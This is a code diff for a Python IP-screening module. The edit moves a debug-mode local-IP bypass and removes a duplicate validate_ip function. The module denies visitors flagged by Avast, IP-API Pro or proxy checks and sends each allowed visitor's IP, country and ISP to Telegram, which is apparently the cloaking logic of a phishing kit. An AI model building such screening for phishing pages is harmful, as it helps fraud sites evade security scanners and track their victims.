@@ -57,12 +57,14 @@ def validate_ip(ip, site_url="https://example.com"):
     Returns:
         bool: True if access should be denied, False if access should be allowed
     """
-    logger.info(f"Validating IP: {ip}")
+    # First check if we're in debug mode and it's a local IP
+    if DEBUG_MODE:
+        local_ips = ["127.0.0.1", "::1"]
+        if ip in local_ips or ip.startswith(("192.168.", "10.")):
+            logger.info(f"DEBUG MODE: Allowing access for local IP: {ip}")
+            return False
     
-    # Skip validation in debug mode for local IPs
-    if DEBUG_MODE and (ip == "127.0.0.1" or ip == "::1" or ip.startswith("192.168.") or ip.startswith("10.")):
-        logger.info(f"DEBUG MODE: Skipping validation for local IP: {ip}")
-        return False
+    logger.info(f"Validating IP: {ip}")
     
     # Initialize variables to store API response data
     country = "Unknown"
@@ -133,6 +135,13 @@ def send_telegram_notification(ip, country, isp, timestamp):
 
 def check_avast_ip_info(ip):
     """Check IP against Avast IP Info API."""
+    # Skip API check for local IPs in debug mode
+    if DEBUG_MODE:
+        local_ips = ["127.0.0.1", "::1"]
+        if ip in local_ips or ip.startswith(("192.168.", "10.")):
+            logger.info(f"DEBUG MODE: Skipping Avast API check for local IP: {ip}")
+            return False, {}
+    
     headers = {
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9',
@@ -241,61 +250,6 @@ def check_mind_media_proxy(ip):
     except Exception as e:
         logger.error(f"Error checking Mind-Media proxy: {str(e)}")
         return False
-
-def validate_ip(ip, site_url="https://example.com"):
-    """
-    Validate an IP address using multiple API services.
-    
-    Args:
-        ip (str): The IP address to validate
-        site_url (str): The site URL to use for the x_deux_check_mail function
-        
-    Returns:
-        bool: True if access should be denied, False if access should be allowed
-    """
-    logger.info(f"Validating IP: {ip}")
-    
-    # Skip validation in debug mode for local IPs
-    if DEBUG_MODE and (ip == "127.0.0.1" or ip == "::1" or ip.startswith("192.168.") or ip.startswith("10.")):
-        logger.info(f"DEBUG MODE: Skipping validation for local IP: {ip}")
-        return False
-    
-    # Initialize variables to store API response data
-    country = "Unknown"
-    isp = "Unknown"
-    
-    # Check Avast IP Info
-    avast_blocked, avast_data = check_avast_ip_info(ip)
-    if avast_blocked:
-        logger.info(f"IP {ip} blocked by Avast IP Info check")
-        return True
-    
-    # Extract country and ISP info from Avast data if available
-    if avast_data:
-        country = avast_data.get('countryName', country)
-        isp = avast_data.get('isp', isp)
-    
-    # Check IP-API Pro
-    ipapi_blocked, ipapi_data = check_ipapi_pro(ip)
-    if ipapi_blocked:
-        logger.info(f"IP {ip} blocked by IP-API Pro check")
-        return True
-    
-    # Update country and ISP info from IP-API data if available
-    if ipapi_data:
-        country = ipapi_data.get('country', country)
-        isp = ipapi_data.get('isp', isp)
-    
-    # Check Mind-Media Proxy
-    if check_mind_media_proxy(ip):
-        logger.info(f"IP {ip} blocked by Mind-Media Proxy check")
-        return True
-    
-    # If we reach here, all checks passed
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    send_telegram_notification(ip, country, isp, timestamp)
-    logger.info(f"IP {ip} allowed access")
-    return False
 
 def get_client_ip(request_handler):
     """
